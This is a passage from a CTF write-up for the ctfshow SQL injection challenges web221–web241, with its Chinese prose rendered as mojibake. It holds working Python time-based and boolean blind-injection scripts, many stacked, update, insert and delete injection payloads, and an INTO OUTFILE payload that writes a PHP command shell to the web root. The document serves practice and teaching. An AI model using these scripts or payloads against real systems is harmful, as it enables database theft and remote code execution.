substrç”¨leftä»£æ›¿å³å¯ï¼Œæœ‰ç‚¹åƒä¹‹å‰å¸ƒå°”ç›²æ³¨çš„ä¸€é“é¢˜ï¼Œåªæ˜¯æ”¹æˆäº†æ—¶é—´ç›²æ³¨ç½¢äº†\n1import requests 2import string 3import time 4 5url = \u0026#34;http://52728b9a-ffae-4f96-b51f-0549bb5cb4e0.challenge.ctf.show/api/\u0026#34; 6str=\u0026#34; _{}-\u0026#34; + string.ascii_lowercase + string.digits 7result = \u0026#39;\u0026#39; 8for i in range(1,45): 9 for j in str: 10 # payload = \u0026#34;select table_name from information_schema.tables where table_schema=database() limit 0,1\u0026#34; 11 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxcac\u0026#39; limit 1,1\u0026#34; 12 payload = \u0026#34;select flagaabcc from ctfshow_flagxcac\u0026#34; 13 14 data = { 15 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(LEFT(({payload}),{i})regexp(\u0026#39;{result+j}\u0026#39;),(select count(*) from information_schema.columns A, information_schema.columns B),1)#\u0026#34;, 16 \u0026#39;debug\u0026#39;: 0 17 } 18 try: 19 r = requests.post(url, data=data, timeout=0.15) 20 time.sleep(0.2) 21 except Exception as e: 22 time.sleep(0.2) 23 result = result + j 24 print(\u0026#34;[*] loading :\u0026#34;+result) 25 break 26 27print(\u0026#34;[*] result :\u0026#34;+result) web221 1æŸ¥è¯¢è¯­å¥ 2 3 //åˆ†é¡µæŸ¥è¯¢ 4 $sql = select * from ctfshow_user limit ($page-1)*$limit,$limit; 5 6è¿”å›é€»è¾‘ 7 8//TODO:å¾ˆå®‰å…¨ï¼Œä¸éœ€è¦è¿‡æ»¤ 9//æ‹¿åˆ°æ•°æ®åº“åå­—å°±ç®—ä½ èµ¢ pç¥çš„æ–‡ç« æœ‰æåˆ°limitæ³¨å…¥\n[è½¬è½½]Mysqlä¸‹Limitæ³¨å…¥æ–¹æ³• | ç¦»åˆ«æ­Œ\npayload:\n?page=1\u0026amp;limit=1%20procedure%20analyse(extractvalue(rand(),concat(0x3a,database())),1) groupæ³¨å…¥ web222 æŸ¥è¯¢è¯­å¥\r//åˆ†é¡µæŸ¥è¯¢\r$sql = select * from ctfshow_user group by $username;\rè¿”å›é€»è¾‘\r//TODO:å¾ˆå®‰å…¨ï¼Œä¸éœ€è¦è¿‡æ»¤ group by å¯ä»¥è¿›è¡Œæ—¶é—´ç›²æ³¨ï¼Œå¸ƒå°”ç›²æ³¨ç­‰\næœ¬æ¥ä»¥ä¸ºæ˜¯æŠ¥é”™æ³¨å…¥çš„ï¼Œå‘ç°å¥½åƒä¸å¤ªè¡Œ\nè¿˜æ˜¯çš„æ—¶é—´ç›²æ³¨\næ‹¿å‰é¢çš„ç›²æ³¨è„šæœ¬æ”¹ä¸€æ”¹\n1import requests 2import time 3url = \u0026#34;http://529d9311-c036-4831-bfa1-b2ca91dae190.challenge.ctf.show/api/?u=\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´ 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼ 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 # æŸ¥è¡¨å 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # æŸ¥åˆ—åå­— 19 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flaga\u0026#39; limit 1,1\u0026#34; 20 # çˆ†å­—æ®µ 21 payload = \u0026#34;select flagaabc from ctfshow_flaga\u0026#34; 22 23 data = f\u0026#34;concat((if (ascii(substr(({payload}),{i},1))\u0026gt;{mid}, sleep(0.05), 2)), 1);\u0026#34; 24 25 try: 26 r = requests.post(url+data, timeout=0.05) 27 time.sleep(0.2) 28 tail = mid 29 except requests.exceptions.Timeout: 30 time.sleep(0.2) 31 # å¦‚æœè¯·æ±‚è¶…æ—¶ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å¤§äºä¸­é—´å€¼ 32 head = mid + 1 33 except Exception as e: 34 time.sleep(0.2) 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­ 40 result += chr(head) 41 else: 42 # å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯ 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web223 1æŸ¥è¯¢è¯­å¥ 2 3 //åˆ†é¡µæŸ¥è¯¢ 4 $sql = select * from ctfshow_user group by $username; 5 6è¿”å›é€»è¾‘ 7 8//TODO:å¾ˆå®‰å…¨ï¼Œä¸éœ€è¦è¿‡æ»¤ 9//ç”¨æˆ·åä¸èƒ½æ˜¯æ•°å­— è¿™é¢˜banæ‰äº†æ•°å­—\nç”¨trueæ¥æ„é€ å‡ºæ•°å­—å³å¯\nè¿™é¢˜ä¸€å¼€å§‹æˆ‘æƒ³ç”¨æ—¶é—´ç›²æ³¨çš„ï¼Œä½†æ˜¯è·‘ä¸å‡ºæ¥ï¼Œåé¢ç›´æ¥æ‹¿y4âœŒçš„å¸ƒå°”ç›²æ³¨è·‘äº†\nå¦‚ä¸‹\n1import requests 2import time 3url = \u0026#34;http://14dc1900-f046-44e8-bfa2-e93fbc2a32b3.challenge.ctf.show/api/?u=\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7def createNum(n): 8 num = \u0026#39;true\u0026#39; 9 if n == 1: 10 return \u0026#39;true\u0026#39; 11 else: 12 for i in range(n - 1): 13 num += \u0026#34;+true\u0026#34; 14 return num 15 16while True: 17 i = i + 1 18 # ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´ 19 head = 32 20 tail = 127 21 22 while head \u0026lt; tail: 23 # äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼ 24 mid = (head + tail) \u0026gt;\u0026gt; 1 25 26 # æŸ¥æ•°æ®åº“-ctfshow_flagas 27 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 28 # æŸ¥å­—æ®µ-flagasabc 29 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagas\u0026#39;\u0026#34; 30 # æŸ¥flag 31 payload = \u0026#34;select flagasabc from ctfshow_flagas\u0026#34; 32 33 34 params = { 35 # \u0026#34;u\u0026#34;: f\u0026#34;if(ascii(substr(({payload}),{createNum(i)},{createNum(1)}))\u0026gt;{createNum(mid)},sleep(true),true)\u0026#34; #æ—¶é—´ç›²æ³¨ ï¼ˆæˆ‘æ²¡è·‘å‡ºæ¥ï¼Œä¸çŸ¥é“ä¸ºå•¥ 36 \u0026#34;u\u0026#34;: f\u0026#34;if(ascii(substr(({payload}),{createNum(i)},{createNum(1)}))\u0026gt;{createNum(mid)},username,\u0026#39;a\u0026#39;)\u0026#34; #å¸ƒå°”ç›²æ³¨ 37 } 38 39 # try: 40 # r = requests.post(url,params=params,timeout=1) 41 # tail = mid 42 # except Exception as e: 43 # head = mid + 1 44 45 r = requests.get(url, params=params) 46 if \u0026#34;userAUTO\u0026#34; in r.text: 47 head = mid + 1 48 else: 49 tail = mid 50 51 if head != 32: 52 # å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­ 53 result += chr(head) 54 else: 55 # å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯ 56 break 57 58 print(result) å¸ƒå°”ç›²æ³¨è¿™ä¹ˆå¿«ï¼Œæˆ‘ä¸ºä»€ä¹ˆè¦æƒ³ä¸å¼€å°è¯•æ—¶é—´ç›²æ³¨å‘¢\nweb224 è¯•äº†è¯•ä¸‡èƒ½å¯†ç ï¼Œå¤±è´¥äº†\nè®¿é—®/robots.txt\nå‘ç°æœ‰é‡ç½®å¯†ç çš„è·¯ç”±\nä¿®æ”¹å¯†ç ä¹‹åç™»å…¥ï¼Œçœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ \nctfshow web224 sql_æ–‡ä»¶ä¸Šä¼ äº§ç”Ÿsqlæ³¨å…¥ è¯¦è§£_sqlæ³¨å…¥æ¼æ´ctfæ–‡ä»¶ä¸Šä¼ -CSDNåšå®¢\nè¿™æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ çš„sqlæ³¨å…¥é¢˜\nå½“æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œåå°ä¼šå°†æ–‡ä»¶åï¼Œæ–‡ä»¶è·¯å¾„ï¼Œæ–‡ä»¶ç±»å‹ï¼ˆæ–‡ä»¶å¤´ï¼‰ç›´æ¥ä¸sqlè¯­å¥è¿›è¡Œæ‹¼æ¥\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œå°†æ–‡ä»¶å¤´æ”¹å†™æˆæˆ‘ä»¬è¦æ‹¼æ¥çš„sqlè¯­å¥ï¼Œä»è€Œå®ç°æ³¨å…¥\nå¦‚å›¾\npayload:\nC64File \u0026#34;\u0026#39;);select 0x3c3f3d60746163202f662a603f3e into outfile \u0026#39;/var/www/html/1.php\u0026#39;;--+ æ–°å»ºæ–‡æœ¬ï¼Œå†™å…¥payloadï¼Œæ”¹åä¸º1.binï¼Œä¸Šä¼ æ–‡ä»¶ï¼Œè®¿é—®1.binæ‹¿åˆ°flag\nå †å æ³¨å…¥ web225 æ²¡æœ‰è¿‡æ»¤show\nusername=1\u0026#39;;show tables; å¯ä»¥ç”¨handlerè¯»\npayload:\nusername=ctfshow\u0026#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first; 1.handler ctfshow_flag as a open;\nHANDLER è¯­å¥æ˜¯ MySQL ä¸­ç”¨äºç›´æ¥æ“ä½œè¡¨çš„ä¸€ç§ç‰¹æ®Šæ–¹å¼ã€‚æ­¤è¯­å¥çš„ä½œç”¨æ˜¯æ‰“å¼€ä¸€ä¸ªåä¸º ctfshow_flag çš„è¡¨ï¼Œå¹¶å°†å…¶åˆ«åä¸º aã€‚HANDLER è¯­å¥å¯ä»¥ç»•è¿‡ä¸€äº›å¸¸è§„çš„æŸ¥è¯¢æœºåˆ¶ï¼Œç›´æ¥è®¿é—®è¡¨çš„æ•°æ®ï¼Œé€šå¸¸ç”¨äºé«˜æ•ˆåœ°è·å–æ•°æ®ã€‚\n2.handler ctfshow_flag as a read first;\nè¯¥è¯­å¥ç»§ç»­ä½¿ç”¨ HANDLER æ¥æ“ä½œä¹‹å‰æ‰“å¼€çš„ ctfshow_flag è¡¨ï¼ˆåˆ«å aï¼‰ï¼Œread first è¡¨ç¤ºè¯»å–è¡¨ä¸­çš„ç¬¬ä¸€è¡Œæ•°æ®ã€‚\nå…¶ä»–æ–¹æ³•\nweb226 1æŸ¥è¯¢è¯­å¥ 2 3 //åˆ†é¡µæŸ¥è¯¢ 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½ 9 if(preg_match(\u0026#39;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\\(/i\u0026#39;,$username)){ 10 die(json_encode($ret)); 11 } è¿™é“é¢˜æŠŠshowç»™wafæ‰äº†\nè¿™é¢˜å¯ä»¥ç”¨é¢„å¤„ç†æ¥æ‰“\n[SQLæ³¨å…¥][å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨(ä¸‰ç§å§¿åŠ¿)-CSDNåšå®¢\næ ¼å¼\nPREPARE name from \u0026#39;[my sql sequece]\u0026#39;; //é¢„å®šä¹‰SQLè¯­å¥\rEXECUTE name; //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥\r(DEALLOCATE || DROP) PREPARE name; //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥ æˆ‘ä»¬å¯ä»¥å…ˆå°†è¦æ‰§è¡Œçš„è¯­å¥è½¬æ¢æˆ16è¿›åˆ¶åï¼Œä½œä¸ºé¢„å¤„ç†çš„sqlè¯­å¥ä¼ å…¥ï¼Œå¹¶æ‰§è¡Œ\npayload\nusername=1\u0026#39;;PREPARE tables from 0x73686f77207461626c6573;EXECUTE tables;\r//show tables\rusername=1\u0026#39;;PREPARE columns from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d6461746162617365282920616e64207461626c655f6e616d653d2763746673685f6f775f666c6167617327;EXECUTE columns;\r//select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;ctfsh_ow_flagas\u0026#39;\rusername=1\u0026#39;;PREPARE flag from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE flag;\r//select flagasb from ctfsh_ow_flagas\r//ctfshow{7d0038e7-cede-48cc-b0fb-307177d26890} web227 è¿™é“é¢˜æ²¡åŠæ³•é€šè¿‡æŸ¥è¡¨æ‹¿åˆ°flag\nè¿™é“é¢˜çš„payloadæ˜¯\n1\u0026#39;;call getFlag(); å°±æ˜¯æ‰§è¡ŒgetFlagå‡½æ•°æ‹¿åˆ°flag\nä½†é—®é¢˜æ˜¯æˆ‘ä»¬è¦æ€ä¹ˆçŸ¥é“è¿™ä¸ªå‡½æ•°å‘¢\næˆ‘ä»¬éœ€è¦æŸ¥çœ‹MySQLçš„å­˜å‚¨è¿‡ç¨‹ï¼Œå¦‚ä¸‹æ–‡\nMySQLâ€”â€”æŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°_mysql æŸ¥è¯¢function-CSDNåšå®¢\nSELECT * FROM information_schema.Routines é€šè¿‡é¢„å¤„ç†æ‰§è¡Œ\nusername=1\u0026#39;;PREPARE Routines from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;EXECUTE Routines; å¯ä»¥çœ‹åˆ°getFlagå‡½æ•°å’Œflag\nweb228 æŸ¥è¯¢è¯­å¥\r//åˆ†é¡µæŸ¥è¯¢\r$sql = \u0026#34;select id,username,pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\r$bansql = \u0026#34;select char from banlist;\u0026#34;;\rè¿”å›é€»è¾‘\r//å¸ˆå‚…è¯´å†…å®¹å¤ªå¤šï¼Œå°±å†™å…¥æ•°æ®åº“ä¿å­˜\rif(count($banlist)\u0026gt;0){\rforeach ($banlist as $char) {\rif(preg_match(\u0026#34;/\u0026#34;.$char.\u0026#34;/i\u0026#34;, $username)){\rdie(json_encode($ret));\r}\r}\r} åŒweb226\nweb229 åŒweb226\nweb230 åŒweb226\nupdateæ³¨å…¥ web231 æŸ¥è¯¢è¯­å¥\r//åˆ†é¡µæŸ¥è¯¢\r$sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\rè¿”å›é€»è¾‘\r//æ— è¿‡æ»¤\rçŸ¥é“updateå‡½æ•°çš„ä½œç”¨ä¹‹åå°±å¥½ç†è§£äº†\nå¯ä»¥é€šè¿‡updateå‡½æ•°æ›´æ–°ctfshow_userè¡¨ä¸­çš„å†…å®¹\nåˆ©ç”¨updateå°†æŸ¥è¯¢ç»“æœå†™å…¥è¡¨ä¸­\npassword=1\u0026#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026amp;username=1 æŸ¥è¡¨å\rpassword=1\u0026#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026amp;username=1\ræŸ¥åˆ—å\rpassword=1\u0026#39;,username=(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flaga\u0026#39;) where 1=1#\u0026amp;username=1\rå¾—åˆ°flag\rpassword=1\u0026#39;,username=(select flagas from flaga) where 1=1#\u0026amp;username=1\råŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/solitudi/article/details/110144623 web232 æŸ¥è¯¢è¯­å¥\r//åˆ†é¡µæŸ¥è¯¢\r$sql = \u0026#34;update ctfshow_user set pass = md5(\u0026#39;{$password}\u0026#39;) where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\rè¿”å›é€»è¾‘\r//æ— è¿‡æ»¤ åŒweb231\npassword=1\u0026#39;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026amp;username=1\rpassword=1\u0026#39;),username=(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flagaa\u0026#39;) where 1=1#\u0026amp;username=1\rpassword=1\u0026#39;),username=(select flagass from flagaa) where 1=1#\u0026amp;username=1 web233 æŸ¥è¯¢è¯­å¥\r//åˆ†é¡µæŸ¥è¯¢\r$sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\rè¿”å›é€»è¾‘\r//æ— è¿‡æ»¤ è¿™é“é¢˜è²Œä¼¼wafæ‰äº†å•å¼•å·ï¼Œå¯¼è‡´æ— æ³•æ„é€ é—­åˆï¼Œå‰é¢çš„æ–¹æ³•ç”¨ä¸äº†\næ–¹æ³•ä¸€ wpçœ‹åˆ°çš„éªšæ“ä½œ\npayload\n#è·å–è¡¨å\rpassword=\\\u0026amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23\r#è·å–åˆ—å\rpassword=\\\u0026amp;username=,username=(select group_concat(column_name) from information_schema.columns where table_schema=database())%23\r#è·å–æ•°æ®\rpassword=\\\u0026amp;username=,username=(select group_concat(flagass233) from flag233333) æ–¹æ³•äºŒ ï¼šç›²æ³¨ 1\u0026#34;\u0026#34;\u0026#34; 2Author:Y4tacker 3\u0026#34;\u0026#34;\u0026#34; 4import requests 5 6url = \u0026#34;http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1\u0026amp;limit=10\u0026#34; 7 8result = \u0026#34;\u0026#34; 9i = 0 10 11while 1: 12 i = i + 1 13 head = 32 14 tail = 127 15 16 while head \u0026lt; tail: 17 mid = (head + tail) \u0026gt;\u0026gt; 1 18 # æŸ¥æ•°æ®åº“ 19 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 20 # æŸ¥è¡¨å 21 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;flag233333\u0026#39; limit 1,1\u0026#34; 22 # æŸ¥æ•°æ® 23 payload = \u0026#34;select flagass233 from flag233333\u0026#34; 24 data = { 25 \u0026#39;username\u0026#39;: f\u0026#34;1\u0026#39; or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(0.05),1)#\u0026#34;, 26 \u0026#39;password\u0026#39;: \u0026#39;4\u0026#39; 27 } 28 try: 29 r = requests.post(url, data=data, timeout=0.9) 30 tail = mid 31 except Exception as e: 32 head = mid + 1 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web234 æŸ¥è¯¢è¯­å¥\r//åˆ†é¡µæŸ¥è¯¢\r$sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\rè¿”å›é€»è¾‘\r//æ— è¿‡æ»¤ åŒweb233ï¼Œç”¨\\å®ç°é€ƒé€¸\nweb235 1æŸ¥è¯¢è¯­å¥ 2 3 //åˆ†é¡µæŸ¥è¯¢ 4 $sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //è¿‡æ»¤ or \u0026#39; or \u0026lsquo; è¢«ç¦å¯¼è‡´information_schema.tablesä¹Ÿè¢«ç¦äº†\nå¯¼è‡´æˆ‘ä»¬æ²¡åŠæ³•æŸ¥è¯¢åˆ—\nè¿™ç§æƒ…å†µæ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ ï¼šCTF|mysqlä¹‹æ— åˆ—åæ³¨å…¥ - çŸ¥ä¹\nåœ¨ information_schema ä¸­ï¼Œé™¤äº† SCHEMATAã€TABLESã€COLUMNS æœ‰è¡¨ä¿¡æ¯å¤–ï¼Œé«˜ç‰ˆæœ¬çš„ mysql ä¸­ï¼Œè¿˜æœ‰ INNODB_TABLES åŠ INNODB_COLUMNS ä¸­è®°å½•ç€è¡¨ç»“æ„ã€‚\nè¯»è¡¨\nusername=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#\u0026amp;password=\\ æŸ¥å­—æ®µ\nusername=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#\u0026amp;password=\\ web236 1æŸ¥è¯¢è¯­å¥ 2 3 //åˆ†é¡µæŸ¥è¯¢ 4 $sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //è¿‡æ»¤ or \u0026#39; flag è¯»è¡¨\nusername=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#\u0026amp;password=\\\r//banlist,ctfshow_user,flaga è¯»å­—æ®µ\nusername=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,1)a)#\u0026amp;password=\\ è¿™é¢˜æ–°å¢çš„flagè¿‡æ»¤ï¼Œä½†æ˜¯å®é™…ä¸Šæ²¡æœ‰å½±å“ï¼Œæˆ–è®¸æ˜¯è¿‡æ»¤è¿”å›çš„å†…å®¹ï¼Ÿ\ninsertæ³¨å…¥ web237 1æŸ¥è¯¢è¯­å¥ 2 3 //æ’å…¥æ•°æ® 4 $sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //æ— è¿‡æ»¤ insertå‡½æ•°ç”¨äºæ’å…¥å€¼\nå…¶å®è·Ÿupdateæ³¨å…¥å·®ä¸å¤š\npayload:\nè¯»è¡¨å\npassword=1\u0026amp;username=1\u0026#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));# æŸ¥åˆ—å\npassword=1\u0026amp;username=1\u0026#39;,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flag\u0026#39;));#\r//id,flagass23s3,info çˆ†å­—æ®µ\npassword=1\u0026amp;username=1\u0026#39;,(select flagass23s3 from flag));# web238 1æŸ¥è¯¢è¯­å¥ 2 3 //æ’å…¥æ•°æ® 4 $sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //è¿‡æ»¤ç©ºæ ¼ æµ‹äº†ä¸€ä¸‹å‘ç°ä¸æ­¢æ˜¯ç©ºæ ¼ï¼Œè¿åŒä¸€äº›ä»£æ›¿ç©ºæ ¼çš„å­—ç¬¦ä¹Ÿè¢«ä¸€åŒwafäº†ï¼Œæ¯”å¦‚/**/\næˆ‘ä»¬å¯ä»¥è€ƒè™‘ç”¨æ‹¬å·ä»£æ›¿ç©ºæ ¼\npayload\n#è·å–è¡¨å\rusername=1\u0026#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))%23\u0026amp;password=1\r#è·å–åˆ—å\rusername=1\u0026#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;flagb\u0026#39;)))%23\u0026amp;password=1\r#è·å–æ•°æ®\rusername=1\u0026#39;,(select(group_concat(flag))from(flagb)))%23\u0026amp;password=1 web239 æŸ¥è¯¢è¯­å¥\r//æ’å…¥æ•°æ®\r$sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;;\rè¿”å›é€»è¾‘\r//è¿‡æ»¤ç©ºæ ¼ or payload:\nè¯»è¡¨\nusername=1\u0026#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#\u0026amp;password=1 ç”±äº*è¢«banæ‰äº†ï¼Œæ²¡åŠæ³•ç”¨ä¹‹å‰æ— åˆ—åçˆ†å­—æ®µçš„æ–¹æ³•\nè¿™é‡ŒçŒœæµ‹åˆ—åä¸ºflagï¼Œç›´æ¥è¯»\nusername=1\u0026#39;,(select(flag)from(flagbb)))#\u0026amp;password=1 web240 Hint: è¡¨åå…±9ä½ï¼Œflagå¼€å¤´ï¼Œåäº”ä½ç”±a/bç»„æˆï¼Œå¦‚flagabaabï¼Œå…¨å°å†™ æŸ¥è¯¢è¯­å¥\r//æ’å…¥æ•°æ®\r$sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;;\rè¿”å›é€»è¾‘\r//è¿‡æ»¤ç©ºæ ¼ or sys mysql æ ¹æ®hintå¯ä»¥çŸ¥é“æ˜¯è¦çˆ†ç ´è¡¨å\næ‹¿y4âœŒçš„è„šæœ¬æ”¹ä¸€ä¸‹\n\u0026#34;\u0026#34;\u0026#34;\rAuthor:Y4tacker\r\u0026#34;\u0026#34;\u0026#34;\rimport random\rimport requests\rurl = \u0026#34;http://0a7a5c02-0a05-4efe-86f5-fcf36464cc74.challenge.ctf.show\u0026#34;\rurl_insert = url + \u0026#34;/api/insert.php\u0026#34;\rurl_flag = url + \u0026#34;/api/?page=1\u0026amp;limit=1000\u0026#34;\r# çœ‹å‘½å‡½æ•°\rdef generate_random_str():\rsttr = \u0026#39;ab\u0026#39;\rstr_list = [random.choice(sttr) for i in range(5)]\rrandom_str = \u0026#39;\u0026#39;.join(str_list)\rreturn random_str\rwhile 1:\rdata = {\r\u0026#39;username\u0026#39;: f\u0026#34;1\u0026#39;,(select(flag)from(flag{generate_random_str()})))#\u0026#34;,\r\u0026#39;password\u0026#39;: \u0026#34;\u0026#34;\r}\rr = requests.post(url_insert, data=data)\rr2 = requests.get(url_flag)\rif \u0026#34;ctfshow{\u0026#34; in r2.text:\rfor i in r2.json()[\u0026#39;data\u0026#39;]:\rif \u0026#34;ctfshow{\u0026#34; in i[\u0026#39;pass\u0026#39;]:\rprint(i[\u0026#39;pass\u0026#39;])\rbreak\rbreak web241 sqlè¯­å¥\r//åˆ é™¤è®°å½•\r$sql = \u0026#34;delete from ctfshow_user where id = {$id}\u0026#34;;\rè¿”å›é€»è¾‘\r//æ— è¿‡æ»¤ deleteæ³¨å…¥ï¼Œdeleteå‡½æ•°é¡¾åæ€ä¹‰å°±æ˜¯ä»æ•°æ®åº“ä¸­åˆ é™¤å†…å®¹\næ³¨å…¥ç‚¹åœ¨whereåé¢ï¼Œå¯ä»¥é‡‡ç”¨æ—¶é—´ç›²æ³¨æˆ–è€…å¸ƒå°”ç›²æ³¨ï¼Œä½†æ˜¯ç”±äºdeleteä¼šåˆ é™¤æ•°æ®åº“ä¸­çš„è®°å½•ï¼Œæ‰€ä»¥å¯èƒ½ä¼šå‡ºç°è®°å½•éƒ½åˆ å®Œäº†ä½†æ˜¯flagè¿˜æ²¡æ³¨å‡ºæ¥çš„æƒ…å†µ\n1import requests 2import time 3url = \u0026#39;http://40c66eef-72b4-4b08-88d0-87bef44b640e.challenge.ctf.show/api/delete.php\u0026#39; 4str = \u0026#39;\u0026#39; 5for i in range(1, 60): 6 min,max = 32, 128 7 while True: 8 j = min + (max-min)//2 9 if(min == j): 10 str += chr(j) 11 print(str) 12 break 13 # çˆ†è¡¨å 14 # payload = { 15 # \u0026#39;id\u0026#39;: f\u0026#39;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))\u0026lt;{j},sleep(0.03),1)#\u0026#39; 16 # } 17 # çˆ†åˆ— 18 # payload = { 19 # \u0026#39;id\u0026#39;: f\u0026#34;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flag\u0026#39;),{i},1))\u0026lt;{j},sleep(0.03),1)#\u0026#34; 20 # } 21 # çˆ†å€¼ 22 payload = { 23 \u0026#39;id\u0026#39;: f\u0026#34;if(ascii(substr((select group_concat(flag) from flag),{i},1))\u0026lt;{j},sleep(0.03),1)#\u0026#34; 24 } 25 start_time = time.time() 26 r = requests.post(url=url, data=payload).text 27 end_time = time.time() 28 sub = end_time - start_time 29 if sub \u0026gt;= 0.2: 30 max = j 31 else: 32 min = j ä¸ºä»€ä¹ˆsleepè®¾å®šçš„æ˜¯0.03ï¼Œä½†æ˜¯è¶…æ—¶æ—¶é—´æ˜¯å¤§äº0.2å‘¢\né‚£æ˜¯å› ä¸ºè¦å¯¹æ‰€æœ‰è®°å½•éƒ½ç®—ä¸€é 